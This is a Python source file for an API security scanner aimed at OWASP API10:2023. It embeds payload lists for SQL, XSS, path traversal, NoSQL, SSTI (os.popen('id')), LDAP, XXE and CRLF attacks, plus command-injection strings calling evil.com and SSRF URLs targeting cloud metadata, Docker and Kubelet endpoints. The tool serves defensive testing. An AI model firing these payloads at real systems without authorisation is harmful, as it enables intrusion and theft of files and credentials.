#
# Licensed under the MIT License. 
# Copyright (c) 2025 Perry Mertens
#
# See the LICENSE file for full license text.
"""safe_consumption_audit.py – Enhanced OWASP API10:2023 Auditor
=================================================
Enhanced version with:
* Comprehensive injection payloads (SQL, XSS, Path, NoSQL, SSTI, LDAP, XXE)
* CRLF / Header Injection tests
* HTTP Parameter Pollution (HPP)
* SSRF Vector tests
* Docker Remote API exposure tests
* Kubernetes API exposure tests
* GraphQL Introspection tests
* Rate limiting and whitelist support
* Improved error handling
* INFO logging for progress tracking
"""
from __future__ import annotations
import json
import ssl
import socket
import urllib3
import urllib.parse as urlparse
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Optional
import re
import time
import requests
from tqdm import tqdm
from colorama import Fore, Style  # Optioneel voor kleur
import concurrent.futures
from functools import partial
import logging 
from report_utils import ReportGenerator

logging.getLogger("urllib3").setLevel(logging.CRITICAL)

Issue = Dict[str, Any]

class SafeConsumptionAuditor:
    """Security auditor for OWASP API10 with comprehensive tests and INFO-logging"""
    INJECTION_PAYLOADS = {
    'sql': [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT null--",
        "' AND SLEEP(5)--",
        "'||(SELECT version())||'",
        '" OR "" = ""',
        "' OR 'a'='a"
    ],   
    'xss': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '\"><script>alert(document.domain)</script>',
        "'\"><iframe src=\"javascript:alert(1)\"></iframe>",
        '<math><mi//xlink:href="javascript:alert(1)">'
    ],
    'path': [
        # Klassiek
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/../../../../boot.ini",

        # URL-encoded
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%2f..%2f..%2fetc%2fshadow",
        "/etc/passwd%00",

        # Double URL-encoded
        "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        "%252e%252e%252fetc%252fpasswd",  # = decode twice to ../etc/passwd

        # UTF-8 en mixed encoding
        "..%c0%af..%c0%afetc/passwd",       # Overlong UTF-8 slash
        "..%e0%80%afetc/passwd",           # Overlong 3-byte encoding
        "..%c1%9c..%c1%9cetc/passwd",      # Malformed UTF-8
        "..%uff0e%uff0e%u2215etc%u2215passwd",  # Full-width + Unicode slash

        # Backslashes & alternate separators
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\\\..\\\\etc\\\\passwd",
        "..//..//..//etc//passwd",

        # Null byte
        "/etc/passwd%00.png",  # legacy PHP vuln vector

        # Encoded slashes in mixed form
        "..%2f..%2f%2e%2e%2fetc%2fpasswd",

        # Bypassing file extension filters
        "../../etc/passwd%00.jpg",
        "../../etc/passwd..;/",
    ],    
    'nosql': [
        '{"username": {"$ne": null}, "password": {"$ne": null}}', '{"$or": [{"admin": true}, {}]}',
        '{"$where": "sleep(5000)"}', '{"username": {"$regex": ".*"}}', '{"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}'
    ],
    'ssti': [
        "{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "{{config}}", "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    ],
    'ldap': [
        "*)(&(userPassword=*))", "(&(objectClass=*)(uid=*))", "*)%00", "*)(cn=*))(|(cn=*", "*))(|"
    ],
    'xxe': [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'> %ext;]>"
    ],
    'cmdi': [
        ";whoami", "|id", "&nslookup test", "`id`", "$(id)", "|| ping -c 1 evil.com", "&& curl http://evil.com"
    ],
    'jsonp': [
        "callback=alert", "callback=console.log", "jsonp=alert", "cb=alert", "callbackName=alert"
    ]
    }
    CRLF_PAYLOADS = [
    '%0d%0aX-Evil: injected',          # klassiek CRLF
    '%0a%0dSet-Cookie: pwned=true',    # omgekeerde volgorde
    '\r\nX-Injected-Header: crlf',     # directe CRLF
    '\r\nSet-Cookie: session=abc123',  # cookie injectie
    '%0d%0aLocation: https://evil.com',# redirect injectie
    '%0d%0aContent-Length: 0',         # header truncatie
    '%0d%0aContent-Type: text/html',   # content type override
    '%0d%0aRefresh: 0; url=https://evil.com',  # redirect via refresh
    '%0d%0aLink: </malicious>; rel=preload',   # preload link injectie
    '%0d%0aX-Frame-Options: DENY',     # security header override
    '%0d%0aX-XSS-Protection: 0',       # XSS bescherming uitschakelen
    '%0d%0aAccess-Control-Allow-Origin: *',  # CORS bypass
    '%0d%0aVary: Origin',              # cache & CORS manipulatie
    '%0d%0aSet-Cookie: __Host-pwned=1; Path=/; Secure; HttpOnly',
    '%0d%0aConnection: close',         # response manipulatie
    ]
    HPP_PARAMS = [
    'id', 'q', 'search', 'filter', 'sort', 'order', 'page', 'offset', 'limit',
    'username', 'user', 'email', 'token', 'session', 'auth', 'access', 'role',
    'callback', 'lang', 'debug', 'redirect', 'ref', 'category', 'tag', 'type',
    'status', 'id[]', 'name', 'fields', 'expand', 'include', 'exclude'
    ]

    SSRF_PAYLOADS = [
    # Lokale metadata services (cloud)
    "http://169.254.169.254/latest/meta-data/",         # AWS EC2
    "http://169.254.169.254/metadata/instance",         # Azure
    "http://169.254.169.254/computeMetadata/v1/",       # GCP
    "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud
    "http://metadata.google.internal/computeMetadata/",

    # Lokale bestanden en protocollen
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "file:///proc/self/environ", "file:///sys/class/net/eth0/address",

    # Gopher en Redis
    "gopher://127.0.0.1:6379/_PING", "gopher://127.0.0.1:11211/",
    "gopher://127.0.0.1:80/_GET / HTTP/1.0",             # HTTP tunnel

    # DNS rebinding / SSRF exfil via callback
    "http://localhost", "http://127.0.0.1", "http://[::1]",
    "http://0.0.0.0", "http://2130706433",               # 127.0.0.1 in int
    "http://example.com@127.0.0.1",                      # Username trick
    "http://127.0.0.1.nip.io",                           # Wildcard DNS
    "http://127.0.0.1.xip.io",

    # Headers for SSRF probes (optional)
    "http://attacker.com/ssrf/test",                    # Outbound test
    "http://burpcollaborator.net",                      # Interact.sh / OAST
    "http://requestbin.net/r/abc123",                   # Monitoring SSRF

    # Custom ports and service abuse
    "http://127.0.0.1:80", "http://localhost:8000",
    "http://localhost:2375/version",                    # Docker API
    "http://localhost:10250/pods",                      # Kubernetes Kubelet
    "http://localhost:5984/_all_dbs",                   # CouchDB
    ]

    GRAPHQL_INTROSPECTION_QUERY = """
    query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
        ...FullType
        }
        directives {
        name
        description
        locations
        args {
            ...InputValue
        }
        }
    }
    }

    fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
        ...InputValue
        }
        type {
        ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
    }

    fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
    }

    fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
        kind
        name
        }
    }
    }
"""

    
    def __init__(self, base_url: str, session: Optional[requests.Session] = None, timeout: int = 8):
        self.base_url = base_url.rstrip('/')
        self.session = session or self._create_secure_session()
        self.timeout = timeout
        self.issues: List[Dict[str, Any]] = []
        self.rate_limit = 0.5  # seconds between requests


    def _create_secure_session(self) -> requests.Session:
        sess = requests.Session()
        sess.headers.update({'User-Agent': 'SafeAPIAuditor/2.0', 'Accept': 'application/json'})
        sess.verify = True
        return sess

    @staticmethod
    def third_party_hosts_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        hosts: Set[str] = set()
        for srv in spec.get('servers', []):
            url = srv.get('url')
            if url:
                parsed = urlparse.urlparse(url)
                if parsed.netloc:
                    hosts.add(parsed.netloc.split(':')[0])
        def walk(node: Any):
            if isinstance(node, dict):
                for k, v in node.items():
                    if k == '$ref' and isinstance(v, str) and v.startswith('http'):
                        hosts.add(urlparse.urlparse(v).netloc.split(':')[0])
                    walk(v)
            elif isinstance(node, list):
                for item in node:
                    walk(item)
        walk(spec)
        return sorted(hosts)

    @staticmethod
    def endpoints_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        servers = [srv.get('url').rstrip('/') for srv in spec.get('servers', []) if srv.get('url')]
        paths = spec.get('paths', {})
        endpoints: List[str] = []
        for server in servers:
            for path in paths:
                endpoints.append(server + path)
        return endpoints
    
    def _test_injection(self, test_url: str, t: str) -> None:
        """Hulp methode voor parallelle injection tests"""
        time.sleep(self.rate_limit)
        try:
            r = self.session.get(test_url, timeout=self.timeout/2, allow_redirects=False)
            if self._is_injection_successful(r, t):
                self._log(
                    issue=f'Possible {t.upper()} injection',
                    target=test_url,
                    severity='Critical',
                    payload=urlparse.unquote(test_url.split('=')[1]),
                    response_sample=r.text
                )
        except:
            pass    
    
    def _log(self,
             issue: str,
             target: str,
             severity: str,
             payload: Optional[str] = None,
             response_sample: Optional[str] = None):
        entry = {
            'issue':      issue,
            'target':     target,
            'severity':   severity,
            'timestamp':  datetime.now().isoformat(),
            'scanner':    'SafeAPI-Auditor-2.0'
        }
        if payload:
            entry['payload'] = payload
        if response_sample:
            entry['response_sample'] = response_sample[:200]
        self.issues.append(entry)

    def _is_injection_successful(self, response: requests.Response, attack_type: str) -> bool:
        if response.status_code >= 500:
            return True
        content = response.text.lower()
        if attack_type == 'sql' and any(term in content for term in ['sql', 'syntax', 'error', 'unclosed']):
            return True
        return False

    def _test_basic_security(self, host: str):
        print(f"[INFO] Basic security test for {host}")
        try:
            url = self.base_url  # gebruik altijd de base_url
            r = self.session.get(url, timeout=self.timeout)
            if r.status_code >= 400:
                self._log('Basic security fail', url, 'Medium', response_sample=r.text)
        except Exception as e:
            self._log('Basic security error', host, 'Medium')


    def _test_crlf_injection(self, host: str):
        print(f"[INFO] CRLF Injection tests for {host}")
        for payload in self.CRLF_PAYLOADS:
            try:
                url = f"{self.base_url}/?q={payload}"
                r = self.session.get(url, timeout=self.timeout)
                if 'evil' in r.text.lower():
                    self._log('CRLF Injection', url, 'High', payload=payload, response_sample=r.text)
            except:
                pass

    def _test_hpp(self, host: str):
        print(f"[INFO] HTTP Parameter Pollution tests for {host}")
        for param in self.HPP_PARAMS:
            try:
                url = f"{self.base_url}/?{param}=1&{param}=2"
                r = self.session.get(url, timeout=self.timeout)
                if ',' in r.text:
                    self._log('HPP detected', url, 'Medium', response_sample=r.text)
            except:
                pass

    def _test_ssrf(self, host: str):
        print(f"[INFO] SSRF tests for {host}")
        for payload in self.SSRF_PAYLOADS:
            try:
                url = payload
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code < 400:
                    self._log('SSRF endpoint accessible', payload, 'High', response_sample=r.text)
            except:
                pass

    def _test_docker_api(self, host: str):
        print(f"[INFO] Docker API test for {host}")
        try:
            r = self.session.get(f"http://{host}:2375/version", timeout=self.timeout)
            if r.status_code == 200:
                self._log('Docker Remote API open', host, 'High', response_sample=r.text)
        except:
            pass

    def _test_kubernetes_api(self, host: str):
        print(f"[INFO] Kubernetes API test for {host}")
        try:
            for port in [6443, 2379]:
                url = f"{self.base_url}:{port}/version"
                r = self.session.get(url, timeout=self.timeout, verify=False)
                if r.status_code == 200:
                    self._log('Kubernetes API open', f"{host}:{port}", 'High', response_sample=r.text)
        except:
            pass


    def _test_graphql_introspection(self, host: str):
        print(f"[INFO] GraphQL introspection test for {host}")
        try:
            url = f"{self.base_url}/graphql"
            r = self.session.post(url, json={'query': self.GRAPHQL_INTROSPECTION_QUERY}, timeout=self.timeout)
            if 'data' in r.json():
                self._log('GraphQL introspection available', url, 'Medium', response_sample=str(r.json()))
        except:
            pass

    def _test_sensitive_data_exposure(self, host: str):
        print(f"[INFO] Sensitive data exposure test for {host}")
        try:
            url = f"{self.base_url}/api/v1/config"
            r = self.session.get(url, timeout=self.timeout)
            for term in ['password', 'secret', 'token']:
                if term in r.text.lower():
                    self._log('Sensitive data exposure', url, 'High', response_sample=r.text)
        except:
            pass
    def _execute_test(self, test_func: callable, host: str) -> tuple[str, float]:
        """Uitgevoerde test met timing"""
        start_time = time.time()
        test_func(host)
        return (test_func.__name__, time.time() - start_time)

    def test_endpoints(self, endpoints: List[str]) -> List[Issue]:
        print(f"{Fore.CYAN}[INFO] Starting scan of {len(endpoints)} endpoints...{Style.RESET_ALL}")
        
        # Parallelle verwerking voor endpoints
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            for url in tqdm(endpoints, desc="Testing endpoints", unit="endpoint"):
                host = urlparse.urlparse(url).netloc
                print(f"\n{Fore.YELLOW}[Testing] {url}{Style.RESET_ALL}")
                
                try:
                    # Parallelle uitvoering van security tests
                    test_methods = [
                        self._test_basic_security,
                        self._test_crlf_injection,
                        self._test_hpp,
                        self._test_ssrf,
                        self._test_docker_api,
                        self._test_kubernetes_api,
                        self._test_graphql_introspection,
                        self._test_sensitive_data_exposure
                    ]
                    
                    # Voer alle tests parallel uit
                    test_results = list(executor.map(
                        partial(self._execute_test, host=host),
                        test_methods
                    ))
                    
                    # Toon resultaten
                    for name, elapsed in test_results:
                        print(f"{Fore.GREEN}  ✓ {name} ({elapsed:.2f}s){Style.RESET_ALL}")

                    # Parallelle injection tests
                    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as injection_executor:
                        for t, payloads in self.INJECTION_PAYLOADS.items():
                            print(f"{Fore.BLUE}  Running {t.upper()} tests...{Style.RESET_ALL}")
                            
                            # Maak lijst van test URLs
                            test_urls = [f"{url}?input={urlparse.quote(p)}" for p in payloads]
                            
                            # Voer parallel uit
                            results = list(tqdm(
                                injection_executor.map(
                                    partial(self._test_injection, t=t),
                                    test_urls
                                ),
                                total=len(test_urls),
                                desc=f"{t} payloads",
                                leave=False
                            ))

                except Exception as e:
                    self._log('Endpoint testing failed', f'{url} - {e}', 'Medium')
                    print(f"{Fore.RED}   Error: {e}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[INFO] Scan completed. Found {len(self.issues)} issues.{Style.RESET_ALL}")
        return self.issues

    def generate_report(self, fmt: str = 'markdown') -> str:
        return ReportGenerator(
            issues=self.issues,
            scanner="SafeConsumption",
            base_url=self.base_url
        ).generate_markdown() if fmt == "markdown" else ReportGenerator(
            issues=self.issues,
            scanner="SafeConsumption",
            base_url=self.base_url
        ).generate_json()


        return '\n'.join(lines)

    def save_report(self, path: str, fmt: str = 'markdown'):
        ReportGenerator(self.issues, scanner="SafeConsumption", base_url=self.base_url).save(path, fmt=fmt)

